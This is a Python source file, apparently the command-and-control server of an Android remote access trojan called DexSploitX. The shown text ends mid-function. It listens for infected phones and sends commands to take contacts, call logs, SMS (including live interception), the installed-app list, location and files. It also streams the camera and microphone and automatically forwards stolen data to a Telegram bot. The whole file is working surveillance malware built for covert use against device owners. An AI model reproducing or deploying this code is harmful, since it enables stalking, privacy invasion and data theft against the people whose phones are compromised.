#!/usr/bin/env python3
import socket
import threading
import argparse
import json
import os
import webbrowser
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import time
from urllib.parse import parse_qs
import tempfile
import time
import requests

# Protocol constants for unified TCP
MSG_CMD = "CMD:"
MSG_RES = "RES:"
MSG_CAM = "CAM:"
MSG_AUD = "AUD:"
MSG_FIL = "FIL:"
MSG_FCH = "FCH:"
MSG_FEN = "FEN:"
MSG_SMS = "SMS:"
MSG_LOC = "LOC:"

class MessageParser:
    """Parse unified TCP protocol messages"""
    def __init__(self):
        self.buffer = b""
        
    def feed(self, data):
        self.buffer += data
        while True:
            msg = self.parse_next()
            if msg is None:
                break
            yield msg
            
    def parse_next(self):
        if len(self.buffer) < 4:
            return None
            
        if self.buffer.startswith(b"RES:"):
            return self._parse_text(b"RES:", "response")
        elif self.buffer.startswith(b"CAM:"):
            return self._parse_binary(b"CAM:", "camera")
        elif self.buffer.startswith(b"AUD:"):
            return self._parse_binary(b"AUD:", "audio")
        elif self.buffer.startswith(b"FIL:"):
            return self._parse_text(b"FIL:", "file_start")
        elif self.buffer.startswith(b"FCH:"):
            return self._parse_binary(b"FCH:", "file_chunk")
        elif self.buffer.startswith(b"FEN:"):
            return self._parse_text(b"FEN:", "file_end")
        elif self.buffer.startswith(b"SMS:"):
            return self._parse_text(b"SMS:", "sms")
        elif self.buffer.startswith(b"LOC:"):
            return self._parse_text(b"LOC:", "location")
        else:
            # Try to parse as old format (no prefix)
            idx = self.buffer.find(b"\n")
            if idx != -1 and idx < 1000:  # Reasonable line length
                payload = self.buffer[:idx].decode('utf-8', errors='ignore')
                self.buffer = self.buffer[idx+1:]
                return {'type': 'response', 'payload': payload}
            self.buffer = self.buffer[1:]
            return None
            
    def _parse_text(self, prefix, msg_type):
        idx = self.buffer.find(b"\n")
        if idx == -1:
            return None
        payload = self.buffer[len(prefix):idx].decode('utf-8', errors='ignore')
        self.buffer = self.buffer[idx+1:]
        return {'type': msg_type, 'payload': payload}
        
    def _parse_binary(self, prefix, msg_type):
        colon_idx = self.buffer.find(b":", len(prefix))
        if colon_idx == -1:
            return None
        try:
            length = int(self.buffer[len(prefix):colon_idx].decode())
        except:
            self.buffer = self.buffer[1:]
            return None
        data_start = colon_idx + 1
        data_end = data_start + length
        if len(self.buffer) < data_end:
            return None
        payload = self.buffer[data_start:data_end]
        self.buffer = self.buffer[data_end:]
        return {'type': msg_type, 'payload': payload, 'length': length}

class DexSploitX:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}
        self.server_socket = None
        self.base_dir = "devices"
        self.current_frame = None
        self.streaming = False
        self.current_device = None
        self.http_server = None
        self.socket_locks = {}
        self.config = self.load_config()
        self.file_uploads = {}  # Track file uploads
        self.audio_files = {}   # Track audio recordings
        self.frame_count = {}   # Track frame counts
        self.pending_commands = {}  # Track pending commands for saving responses
    
    def load_config(self):
        try:
            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {"telegram_bot_token": "", "telegram_chat_id": ""}
    
    def save_config(self):
        try:
            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
            with open(config_path, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            print(f"[-] Error saving config: {e}")
       
    def start_listener(self):
        # Load config and show Telegram status
        if self.config.get('telegram_bot_token'):
            token = self.config['telegram_bot_token']
            chat_id = self.config.get('telegram_chat_id', '')
            print(f"[*] Telegram bot loaded: {token[:20]}...")
            if chat_id:
                print(f"[*] Chat ID: {chat_id}")
            print(f"[*] Auto-dump to Telegram: ENABLED")
        
        # Start HTTP server first
        threading.Thread(target=self.start_http_server, daemon=True).start()
        time.sleep(1)
        print(f"[*] HTTP server started on port 8080")
        
        # Start socket listener
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
       
        print(f"[*] Socket listener started on {self.host}:{self.port}")
        print("[*] Waiting for connections...")
       
        threading.Thread(target=self.accept_connections, daemon=True).start()
        self.command_loop()
   
    def accept_connections(self):
        while True:
            try:
                client_socket, address = self.server_socket.accept()
                threading.Thread(target=self.handle_client, args=(client_socket, address), daemon=True).start()
            except:
                break
   
    def handle_client(self, client_socket, address):
        device_name = "Unknown"
        parser = MessageParser()
        
        try:
            # Enable TCP keepalive
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Platform-specific keepalive settings
            if hasattr(socket, 'TCP_KEEPIDLE'):
                client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
                client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
            
            # First message is device info (RES: or plain JSON)
            data = client_socket.recv(4096)
            
            # Check if data is empty
            if not data or len(data) == 0:
                print(f"[DEBUG] Empty data received from {address[0]}, closing connection")
                return
            
            # Debug: Print raw data
            print(f"[DEBUG] Received {len(data)} bytes from {address[0]}")
            print(f"[DEBUG] First 100 bytes: {data[:100]}")
            
            # Try to parse as unified protocol first
            device_info = None
            for msg in parser.feed(data):
                if msg['type'] == 'response':
                    try:
                        device_info = json.loads(msg['payload'])
                        print(f"[DEBUG] Parsed device info via protocol: {device_info.get('device_name', 'Unknown')}")
                        break
                    except Exception as e:
                        print(f"[DEBUG] Failed to parse protocol message: {e}")
                        pass
            
            # Fallback to old format
            if device_info is None:
                try:
                    decoded = data.decode('utf-8', errors='ignore').strip()
                    
                    # Skip if decoded is empty
                    if not decoded:
                        print(f"[DEBUG] Empty decoded data from {address[0]}, closing connection")
                        return
                    
                    print(f"[DEBUG] Trying to parse as plain JSON: {decoded[:100]}")
                    device_info = json.loads(decoded)
                    print(f"[DEBUG] Parsed device info via plain JSON: {device_info.get('device_name', 'Unknown')}")
                except json.JSONDecodeError as e:
                    print(f"\n[-] Invalid JSON from {address[0]}: {e}")
                    print(f"[DEBUG] Raw data: {data}")
                    return
            
            device_name = device_info.get('device_name', 'Unknown')
           
            device_dir = os.path.join(self.base_dir, device_name)
            os.makedirs(device_dir, exist_ok=True)
           
            self.clients[device_name] = {
                'socket': client_socket,
                'address': address,
                'info': device_info,
                'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'device_dir': device_dir,
                'parser': parser  # Store parser for this client
            }
            
            self.socket_locks[device_name] = threading.Lock()
            self.frame_count[device_name] = 0
           
            print(f"\n[+] Connected: {device_name} ({address[0]})")
            print(f"[*] Active sessions: {len(self.clients)}")
            
            # Auto-configure Telegram on device if configured
            if self.config.get('telegram_bot_token'):
                try:
                    bot_token = self.config['telegram_bot_token']
                    chat_id = self.config.get('telegram_chat_id', '')
                    config_cmd = f"{MSG_CMD}tg-config {bot_token} {chat_id}" if chat_id else f"{MSG_CMD}tg-config {bot_token}"
                    client_socket.send((config_cmd + "\n").encode())
                    time.sleep(0.5)
                except Exception as e:
                    print(f"[-] Telegram auto-config failed: {e}")
           
            # Keep connection alive and handle all message types
            while device_name in self.clients:
                try:
                    client_socket.settimeout(0.5)
                    data = client_socket.recv(8192)
                    if not data:
                        break
                    
                    # Parse unified protocol messages
                    for msg in parser.feed(data):
                        self.handle_message(device_name, msg)
                    
                except socket.timeout:
                    continue
                except Exception as ex:
                    print(f"\n[-] Loop error for {device_name}: {ex}")
                    import traceback
                    traceback.print_exc()
                    break
                
        except Exception as e:
            print(f"\n[-] Error with {device_name}: {e}")
            import traceback
            traceback.print_exc()
        finally:
            if device_name in self.clients:
                del self.clients[device_name]
                if device_name in self.socket_locks:
                    del self.socket_locks[device_name]
                if device_name in self.audio_files:
                    self.audio_files[device_name].close()
                    del self.audio_files[device_name]
                if device_name in self.file_uploads:
                    if 'handle' in self.file_uploads[device_name]:
                        self.file_uploads[device_name]['handle'].close()
                    del self.file_uploads[device_name]
                print(f"\n[-] {device_name} disconnected")
                if self.current_device == device_name:
                    self.streaming = False
                    self.current_device = None
    
    def handle_message(self, device_name, msg):
        """Handle parsed unified protocol message"""
        msg_type = msg['type']
        payload = msg['payload']
        
        if msg_type == 'response':
            # Check if this is location data that needs special formatting
            if payload.startswith('LOCATION:'):
                self.format_and_display_location(payload, device_name)
                return
            
            # Command response - print it
            print(f"[RES] {payload[:200] if len(payload) > 200 else payload}")
            
            # Check if this is a data response that should be saved
            if device_name in self.pending_commands:
                cmd_type = self.pending_commands[device_name]
                data_key = device_name + '_data'
                
                # Initialize response data storage
                if data_key not in self.pending_commands:
                    self.pending_commands[data_key] = {
                        'response_data': '',
                        'last_update': time.time(),
                        'timer': None
                    }
                
                # Accumulate response data
                self.pending_commands[data_key]['response_data'] += payload + '\n'
                self.pending_commands[data_key]['last_update'] = time.time()
                
                # Cancel existing timer if any
                if self.pending_commands[data_key].get('timer'):
                    self.pending_commands[data_key]['timer'].cancel()
                
                # Set a timer to save data after 2 seconds of no new data
                def save_data():
                    if device_name in self.pending_commands and data_key in self.pending_commands:
                        full_data = self.pending_commands[data_key]['response_data']
                        
                        # Determine filename based on command type
                        if cmd_type == 'contacts':
                            filename = 'contacts.txt'
                            icon = '👤'
                            msg_text = f"{icon} Contacts from {device_name}"
                        elif cmd_type == 'calllogs':
                            filename = 'calllogs.txt'
                            icon = '📞'
                            msg_text = f"{icon} Call Logs from {device_name}"
                        elif cmd_type == 'applist':
                            filename = 'applist.txt'
                            icon = '📱'
                            msg_text = f"{icon} App List from {device_name}"
                        elif cmd_type == 'sms':
                            filename = 'sms_complete.txt'
                            icon = '�'
                            # Count messages for summary
                            message_count = full_data.count('[MSG #')
                            msg_text = f"{icon} SMS Messages from {device_name} ({message_count} messages)"
                        else:
                            filename = f'{cmd_type}.txt'
                            icon = '📄'
                            msg_text = f"{icon} {cmd_type.title()} from {device_name}"
                        
                        # Save to file
                        if device_name in self.clients:
                            filepath = os.path.join(self.clients[device_name]['device_dir'], filename)
                            with open(filepath, 'w', encoding='utf-8') as f:
                                f.write(full_data)
                            
                            print(f"\n[+] {cmd_type.title()} saved: {filepath}")
                            
                            # Send to Telegram
                            if self.config.get('telegram_bot_token'):
                                threading.Thread(target=self.send_to_telegram, 
                                               args=(msg_text, filepath), 
                                               daemon=True).start()
                                print(f"[+] {cmd_type.title()} sent to Telegram")
                        
                        # Clean up
                        if device_name in self.pending_commands:
                            del self.pending_commands[device_name]
                        if data_key in self.pending_commands:
                            del self.pending_commands[data_key]
                
                # Start timer (2 seconds)
                timer = threading.Timer(2.0, save_data)
                timer.daemon = True
                timer.start()
                self.pending_commands[data_key]['timer'] = timer
            
        elif msg_type == 'camera':
            # Save camera frame
            self.frame_count[device_name] = self.frame_count.get(device_name, 0) + 1
            frame_dir = os.path.join(self.clients[device_name]['device_dir'], "camera_frames")
            os.makedirs(frame_dir, exist_ok=True)
            
            timestamp = int(time.time() * 1000)
            filepath = os.path.join(frame_dir, f"frame_{timestamp}.jpg")
            
            with open(filepath, 'wb') as f:
                f.write(payload)
            
            self.current_frame = payload
            if self.frame_count[device_name] % 10 == 0:
                print(f"[CAM] Frame {self.frame_count[device_name]} saved ({len(payload)} bytes)")
            
        elif msg_type == 'audio':
            # Save audio chunk to file
            if device_name not in self.audio_files:
                audio_dir = os.path.join(self.clients[device_name]['device_dir'], "audio")
                os.makedirs(audio_dir, exist_ok=True)
                
                timestamp = int(time.time())
                filepath = os.path.join(audio_dir, f"audio_{timestamp}.pcm")
                self.audio_files[device_name] = open(filepath, 'wb')
                print(f"[AUD] Started recording to {filepath}")
            
            self.audio_files[device_name].write(payload)
            self.audio_files[device_name].flush()
            
            # Also store in buffer for HTTP server playback
            if not hasattr(self, 'audio_buffer'):
                self.audio_buffer = bytearray()
            self.audio_buffer.extend(payload)
            # Keep buffer size manageable (last 2 seconds at 16kHz)
            if len(self.audio_buffer) > 32000:
                self.audio_buffer = self.audio_buffer[-32000:]
            
        elif msg_type == 'file_start':
            # File upload started: filename:device:size
            parts = payload.split(':')
            if len(parts) >= 3:
                filename, device, size = parts[0], parts[1], int(parts[2])
                
                safe_filename = filename.replace('/', '_').replace('\\', '_')
                filepath = os.path.join(self.clients[device_name]['device_dir'], safe_filename)
                os.makedirs(os.path.dirname(filepath), exist_ok=True)
                
                self.file_uploads[device_name] = {
                    'filename': filename,
                    'size': size,
                    'received': 0,
                    'handle': open(filepath, 'wb'),
                    'path': filepath
                }
                
                print(f"\n[FIL] Upload started: {filename} ({size} bytes)")
                
        elif msg_type == 'file_chunk':
            # File chunk received
            if device_name in self.file_uploads:
                upload = self.file_uploads[device_name]
                upload['handle'].write(payload)
                upload['received'] += len(payload)
                
                progress = (upload['received'] / upload['size']) * 100
                print(f"\r[FCH] {upload['filename']}: {progress:.1f}% ({upload['received']}/{upload['size']})", end='', flush=True)
                
        elif msg_type == 'file_end':
            # File upload completed
            if device_name in self.file_uploads:
                upload = self.file_uploads[device_name]
                upload['handle'].close()
                
                print(f"\n[FEN] Upload completed: {payload} ({upload['received']} bytes)")
                
                # Send to Telegram
                if self.config.get('telegram_bot_token'):
                    threading.Thread(target=self.send_to_telegram, 
                                   args=(f"📎 {payload}", upload['path']), 
                                   daemon=True).start()
                
                del self.file_uploads[device_name]
                
        elif msg_type == 'sms':
            # Live SMS: type|address|message|timestamp
            parts = payload.split('|')
            if len(parts) >= 4:
                sms_type, address, message, timestamp = parts
                
                icon = "📤" if sms_type == "SENT" else "📱"
                direction = "To" if sms_type == "SENT" else "From"
                
                print(f"\n{icon} [LIVE SMS - {sms_type}] {timestamp}")
                print(f"   {direction}: {address}")
                print(f"   Message: {message}")
                print(f"DexSploitX ({device_name}) > ", end='', flush=True)
                
                # Send to Telegram
                if self.config.get('telegram_bot_token'):
                    tg_msg = f"{icon} Live SMS - {sms_type}\n{direction}: {address}\nMessage: {message}\nTime: {timestamp}\nDevice: {device_name}"
                    threading.Thread(target=self.send_to_telegram, args=(tg_msg,), daemon=True).start()
                    
        elif msg_type == 'location':
            # Live Location: LOCATION:type|LAT:lat|LON:lon|ACC:acc|ALT:alt|SPEED:speed|PROVIDER:provider|TIME:time|URL:url
            if payload.startswith('ERROR:'):
                print(f"\n📍 [LOCATION ERROR] {payload[6:]}")
                print(f"DexSploitX ({device_name}) > ", end='', flush=True)
            else:
                # Parse and format location data nicely
                self.format_and_display_location(payload, device_name)
   
    def send_command(self, device_name, command):
        """Send command with CMD: prefix"""
        if device_name not in self.clients:
            return False
        
        try:
            sock = self.clients[device_name]['socket']
            lock = self.socket_locks[device_name]
            
            with lock:
                msg = f"{MSG_CMD}{command}\n".encode()
                sock.send(msg)
            return True
        except:
            return False
    
    def command_loop(self):
        current_session = None
        while True:
            try:
                prompt = f"DexSploitX ({current_session}) > " if current_session else "DexSploitX > "
                cmd = input(prompt).strip()
                
                if not cmd: continue
                
                if cmd == "sessions":
                    self.list_sessions()
                elif cmd.startswith("session "):
                    name = cmd.split(" ", 1)[1]
                    if name in self.clients:
                        current_session = name
                        print(f"[*] Selected: {name}")
                    else:
                        print("[-] Session not found")
                elif cmd == "back":
                    current_session = None
                elif cmd == "deviceinfo" and current_session:
                    self.show_device_info(current_session)
                elif cmd.startswith("dump-tg-bot"):
                    parts = cmd.split(maxsplit=1)
                    if len(parts) > 1:
                        token_parts = parts[1].split()
                        bot_token = token_parts[0]
                        chat_id = token_parts[1] if len(token_parts) > 1 else ""
                        
                        self.config['telegram_bot_token'] = bot_token
                        if chat_id:
                            self.config['telegram_chat_id'] = chat_id
                        self.save_config()
                        
                        print(f"[+] Telegram bot configured: {bot_token[:20]}...")
                        if chat_id:
                            print(f"[+] Chat ID: {chat_id}")
                        print(f"[*] All data will now auto-dump to Telegram")
                        
                        # Also configure on Android device if session active
                        if current_session and current_session in self.clients:
                            try:
                                sock = self.clients[current_session]['socket']
                                lock = self.socket_locks[current_session]
                                with lock:
                                    config_cmd = f"tg-config {bot_token} {chat_id}" if chat_id else f"tg-config {bot_token}"
                                    sock.send(config_cmd.encode())
                                    sock.settimeout(3.0)
                                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                                    sock.settimeout(None)
                                    if "TG_CONFIGURED" in response:
                                        print(f"[+] Android device also configured for Telegram")
                            except:
                                pass
                    else:
                        print("[-] Usage: dump-tg-bot <bot_token> [chat_id]")
                elif cmd == "contacts" and current_session:
                    self.get_contacts(current_session)
                elif cmd == "calllogs" and current_session:
                    self.get_calllogs(current_session)
                elif cmd == "applist" and current_session:
                    self.get_applist(current_session)
                elif cmd == "sms" and current_session:
                    self.get_sms(current_session)
                elif cmd == "livesms" and current_session:
                    self.start_live_sms(current_session)
                elif cmd == "stoplive" and current_session:
                    self.stop_live_sms(current_session)
                elif cmd.startswith("camstream") and current_session:
                    camera = cmd.split()[-1] if len(cmd.split()) > 1 else "back"
                    self.start_camera_stream(current_session, camera)
                elif cmd == "stopstream" and current_session:
                    self.stop_camera_stream(current_session)
                elif cmd.startswith("vibrate") and current_session:
                    parts = cmd.split()
                    duration = parts[1] if len(parts) > 1 else "500"
                    self.vibrate_device(current_session, duration)
                elif cmd.startswith("playsound") and current_session:
                    parts = cmd.split(maxsplit=1)
                    if len(parts) > 1:
                        self.play_sound(current_session, parts[1])
                    else:
                        print("[-] Usage: playsound <url>")
                elif cmd == "stopsound" and current_session:
                    self.stop_sound(current_session)
                elif cmd == "liveaudio" and current_session:
                    self.start_live_audio(current_session)
                elif cmd == "stopaudio" and current_session:
                    self.stop_live_audio(current_session)
                elif cmd == "location" and current_session:
                    self.get_unified_location(current_session)
                elif cmd.startswith(("ls", "pwd", "cd", "dump", "cat", "storage", "upload", "dumpdir")) and current_session:
                    # Don't send dump-tg-bot to Android
                    if not cmd.startswith("dump-tg-bot"):
                        self.file_command(current_session, cmd)
                elif cmd == "test" and current_session:
                    self.test_command(current_session)
                elif cmd == "exit":
                    print("[*] Shutting down...")
                    break
                elif cmd == "clear" or cmd == "cls":
                    os.system('cls' if os.name == 'nt' else 'clear')
                elif cmd == "help":
                    self.show_help()
                else:
                    print("[-] Unknown command")
            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit")
   
    def send_to_telegram(self, message, file_path=None):
        if not self.config.get('telegram_bot_token'):
            return False
        
        try:
            bot_token = self.config['telegram_bot_token']
            chat_id = self.config.get('telegram_chat_id', bot_token.split(':')[0])
            
            if file_path and os.path.exists(file_path):
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    data = {'chat_id': chat_id, 'caption': message}
                    response = requests.post(url, files=files, data=data, timeout=30)
                    return response.status_code == 200
            else:
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                data = {'chat_id': chat_id, 'text': message}
                response = requests.post(url, json=data, timeout=10)
                return response.status_code == 200
        except Exception as e:
            print(f"[-] Telegram send error: {e}")
            return False
    
    def list_sessions(self):
        if not self.clients:
            print("[-] No active sessions")
            return
        print("\nActive Sessions:")
        for name in self.clients:
            print(f" • {name}")
   
    def show_device_info(self, name):
        info = self.clients[name]['info']
        print("\nDevice Info:")
        for k, v in info.items():
            print(f"   {k}: {v}")
   
    def get_contacts(self, name):
        try:
            # Mark that we're expecting contacts data
            self.pending_commands[name] = 'contacts'
            self.pending_commands[name + '_data'] = {
                'response_data': '',
                'last_update': time.time(),
                'timer': None
            }
            
            self.send_command(name, "contacts")
            print(f"[*] Fetching contacts from {name}... (will be saved and sent to Telegram)")
        except Exception as e:
            print(f"[-] Failed to get contacts: {e}")
   
    def get_calllogs(self, name):
        try:
            # Mark that we're expecting call logs data
            self.pending_commands[name] = 'calllogs'
            self.pending_commands[name + '_data'] = {
                'response_data': '',
                'last_update': time.time(),
                'timer': None
            }
            
            self.send_command(name, "calllogs")
            print(f"[*] Fetching call logs from {name}... (will be saved and sent to Telegram)")
        except Exception as e:
            print(f"[-] Failed to get call logs: {e}")
   
    def get_applist(self, name):
        try:
            # Mark that we're expecting app list data
            self.pending_commands[name] = 'applist'
            self.pending_commands[name + '_data'] = {
                'response_data': '',
                'last_update': time.time(),
                'timer': None
            }
            
            self.send_command(name, "applist")
            print(f"[*] Fetching app list from {name}... (will be saved and sent to Telegram)")
        except Exception as e:
            print(f"[-] Failed to get app list: {e}")
   
    def get_sms(self, name):
        try:
            # Mark that we're expecting SMS data
            self.pending_commands[name] = 'sms'
            self.pending_commands[name + '_data'] = {
                'response_data': '',
                'last_update': time.time(),
                'timer': None
            }
            
            self.send_command(name, "sms")
            print(f"[*] Fetching SMS messages from {name}... (will be saved and sent to Telegram)")
        except Exception as e:
            print(f"[-] Failed to get SMS messages: {e}")
   
    def start_live_sms(self, name):
        """Start live SMS - response will come via handle_message"""
        try:
            if self.send_command(name, "livesms"):
                print(f"[*] Live SMS monitoring command sent to {name}")
                print(f"[*] Incoming and outgoing SMS will be displayed in real-time")
            else:
                print(f"[-] Failed to send command")
        except Exception as e:
            print(f"[-] Communication error: {e}")
   
    def stop_live_sms(self, name):
        """Stop live SMS - response will come via handle_message"""
        try:
            if self.send_command(name, "stoplive"):
                print(f"[*] Stop live SMS command sent to {name}")
            else:
                print(f"[-] Failed to send command")
        except Exception as e:
            print(f"[-] Failed to stop live SMS: {e}")
   
    def show_help(self):
        print("\nCommands:")
        print("   sessions       - List devices")
        print("   session <name> - Select device")
        print("   deviceinfo     - Show info")
        print("   contacts       - Save contacts")
        print("   calllogs       - Save call logs")
        print("   applist        - Save installed apps")
        print("   sms            - Save SMS messages")
        print("   livesms        - Start live SMS monitoring")
        print("   stoplive       - Stop live SMS monitoring")
        print("   location       - Get current location (on-demand, auto-stops)")
        print("   dump-tg-bot <token> [chat_id] - Configure Telegram bot for auto-dump")
        print("   camstream [front/back] - Start camera")
        print("   stopstream     - Stop camera")
        print("   vibrate [ms]   - Vibrate device (default 500ms)")
        print("   playsound <url> - Play sound from URL")
        print("   stopsound      - Stop playing sound")
        print("   liveaudio      - Start live microphone audio")
        print("   stopaudio      - Stop live audio")
        print("   ls             - List files with icons")
        print("   pwd            - Current directory")
        print("   cd <dir>       - Change directory")
        print("   storage        - Go to internal storage")
        print("   dump <file>    - Download single file")
        print("   dumpdir <dir>  - Download entire directory (background)")
        print("   cat <file>     - Show file content")
        print("   upload <file>  - Upload file to server")
        print("   clear / cls    - Clear terminal screen")
        print("   back           - Go back")
        print("   exit           - Quit")
        print("   help           - This menu\n")
   
    def start_camera_stream(self, session_name, camera):
        try:
            self.send_command(session_name, f"camstream {camera}")
            
            self.current_device = session_name
            self.streaming = True
            self.current_frame = None
            
            print(f"[+] Streaming {camera.upper()} camera from {session_name}")
            print(f"[*] Open browser: http://localhost:8080")
            
            time.sleep(0.5)
            webbrowser.open('http://localhost:8080')
            
        except Exception as e:
            print(f"[-] Error starting stream: {e}")
   
    def stop_camera_stream(self, session_name):
        if not self.streaming:
            print("[!] No active stream")
            return
        try:
            self.streaming = False
            self.send_command(session_name, "stopstream")
            print("[+] Stream stopped")
            self.current_device = None
            self.current_frame = None
        except:
            pass
   
    def vibrate_device(self, session_name, duration):
        try:
            self.send_command(session_name, f"vibrate {duration}")
            print(f"[+] Vibrating device for {duration}ms")
        except Exception as e:
            print(f"[-] Failed to vibrate: {e}")
    
    def play_sound(self, session_name, url):
        """Play sound - response will come via handle_message"""
        try:
            if self.send_command(session_name, f"playsound {url}"):
                print(f"[*] Play sound command sent: {url}")
            else:
                print(f"[-] Failed to send command")
        except Exception as e:
            print(f"[-] Failed to play sound: {e}")
    
    def stop_sound(self, session_name):
        """Stop sound - response will come via handle_message"""
        try:
            if self.send_command(session_name, "stopsound"):
                print(f"[*] Stop sound command sent")
            else:
                print(f"[-] Failed to send command")
        except Exception as e:
            print(f"[-] Failed to stop sound: {e}")
    
    def start_live_audio(self, session_name):
        """Start live audio - response will come via handle_message"""
        try:
            if self.send_command(session_name, "liveaudio"):
                self.current_device = session_name
                print(f"[+] Live audio streaming started")
                print(f"[*] Open browser: http://localhost:8080/audio")
                time.sleep(0.5)
                webbrowser.open('http://localhost:8080/audio')
            else:
                print(f"[-] Failed to send command")
        except Exception as e:
            print(f"[-] Failed to start audio: {e}")
    
    def stop_live_audio(self, session_name):
        """Stop live audio - response will come via handle_message"""
        try:
            if self.send_command(session_name, "stopaudio"):
                self.current_device = None
                print(f"[+] Live audio stop command sent")
            else:
                print(f"[-] Failed to send command")
        except Exception as e:
            print(f"[-] Failed to stop audio: {e}")
   
    def test_command(self, session_name):
        try:
            sock = self.clients[session_name]['socket']
            lock = self.socket_locks[session_name]
            with lock:
                sock.send("test".encode('utf-8'))
                sock.settimeout(3.0)
                data = sock.recv(1024).decode('utf-8', errors='ignore')
                sock.settimeout(None)
            print(f"Test response: {data}")
        except Exception as e:
            print(f"Test failed: {e}")
   
    def file_command(self, session_name, command):
        """Send file command - response will come via handle_message"""
        try:
            # Just send the command, response will be handled by message parser
            if not self.send_command(session_name, command):
                print(f"[-] Failed to send command to {session_name}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def _download_file_with_progress(self, sock, path, filename):
        try:
            sock.settimeout(120.0)  # 2 minute timeout for very large files
            
            # Read data continuously until we get complete response
            all_data = b''
            expected_prefix = b'BINARY_DATA:'
            
            print(f"[*] Downloading {filename}...")
            
            while True:
                try:
                    chunk = sock.recv(65536)  # 64KB chunks
                    if not chunk:
                        break
                    all_data += chunk
                    
                    # Show progress based on data received
                    mb_received = len(all_data) / (1024 * 1024)
                    print(f"\r[*] Received: {mb_received:.1f} MB", end='', flush=True)
                    
                    # Check if we have complete base64 data (ends with proper padding)
                    if len(chunk) < 65536 and all_data.startswith(expected_prefix):
                        # Check if base64 data looks complete
                        try:
                            data_str = all_data.decode('utf-8', errors='ignore')
                            if data_str.startswith('BINARY_DATA:'):
                                base64_part = data_str[12:]
                                # Try to decode to verify completeness
                                import base64
                                base64.b64decode(base64_part + '==')  # Test decode
                                break  # Complete data received
                        except:
                            continue  # Keep reading
                        
                except socket.timeout:
                    break
            
            print()  # New line after progress
            
            data = all_data.decode('utf-8', errors='ignore')
            
            # Check for validation/error messages
            if data.startswith(("File not found", "Invalid filename", "Cannot dump directory", "Error")):
                print(f"[-] {data}")
                return
            
            if data.startswith("BINARY_DATA:"):
                import base64
                try:
                    base64_data = data[12:]  # Remove "BINARY_DATA:" prefix
                    
                    # Progress bar for decoding
                    for i in range(21):
                        progress = i * 5
                        print(f"\r[{'█' * i}{'░' * (20 - i)}] {progress}%", end='', flush=True)
                        if i < 20:
                            time.sleep(0.01)
                    
                    print()  # New line
                    
                    # Decode base64
                    binary_data = base64.b64decode(base64_data)
                    
                    with open(path, "wb") as f:
                        f.write(binary_data)
                    
                    print(f"[+] Binary file saved: {path} ({len(binary_data)} bytes)")
                    
                except Exception as e:
                    print(f"[-] Error saving binary file: {e}")
            else:
                print(f"[-] Invalid response format")
            
            sock.settimeout(None)
            
        except Exception as e:
            print(f"[-] Download error: {e}")
            sock.settimeout(None)
   
    def start_http_server(self):
        dex_instance = self
        
        class StreamHandler(BaseHTTPRequestHandler):
            def log_message(self, *args): 
                pass
            
            def do_POST(self):
                if self.path == '/stream':
                    try:
                        length = int(self.headers.get('Content-Length', 0))
                        jpeg_data = self.rfile.read(length)
                        if len(jpeg_data) > 0:
                            dex_instance.current_frame = jpeg_data
                        self.send_response(200)
                        self.end_headers()
                    except:
                        self.send_response(500)
                        self.end_headers()
                elif self.path == '/audio':
                    try:
                        length = int(self.headers.get('Content-Length', 0))
                        audio_data = self.rfile.read(length)
                        if len(audio_data) > 0:
                            # Store audio data for playback (works for both camera and liveaudio)
                            if not hasattr(dex_instance, 'audio_buffer'):
                                dex_instance.audio_buffer = bytearray()
                            dex_instance.audio_buffer.extend(audio_data)
                            # Keep buffer size manageable
                            if len(dex_instance.audio_buffer) > 32000:
                                dex_instance.audio_buffer = dex_instance.audio_buffer[-32000:]
                        self.send_response(200)
                        self.end_headers()
                    except:
                        self.send_response(500)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_GET(self):
                if self.path in ['/', '/camera']:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    try:
                        with open('camera.html', 'r', encoding='utf-8') as f:
                            html_content = f.read()
                        self.wfile.write(html_content.encode())
                    except FileNotFoundError:
                        self.wfile.write(b'<h1>Error: camera.html not found</h1>')
                
                elif self.path == '/audio':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    try:
                        with open('audio.html', 'r', encoding='utf-8') as f:
                            html_content = f.read()
                        self.wfile.write(html_content.encode())
                    except FileNotFoundError:
                        self.wfile.write(b'<h1>Error: audio.html not found</h1>')
                
                elif self.path.startswith('/frame'):
                    self.send_response(200)
                    self.send_header('Content-type', 'image/jpeg')
                    self.send_header('Cache-Control', 'no-cache')
                    self.end_headers()
                    
                    if dex_instance.current_frame:
                        try:
                            self.wfile.write(dex_instance.current_frame)
                        except (ConnectionAbortedError, BrokenPipeError):
                            pass
                
                elif self.path == '/status':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write((dex_instance.current_device or 'None').encode())
                
                elif self.path == '/audio-stream':
                    self.send_response(200)
                    self.send_header('Content-type', 'audio/pcm')
                    self.send_header('Cache-Control', 'no-cache')
                    self.end_headers()
                    
                    if hasattr(dex_instance, 'audio_buffer') and len(dex_instance.audio_buffer) > 0:
                        try:
                            # Send audio data and clear buffer
                            audio_data = bytes(dex_instance.audio_buffer)
                            self.wfile.write(audio_data)
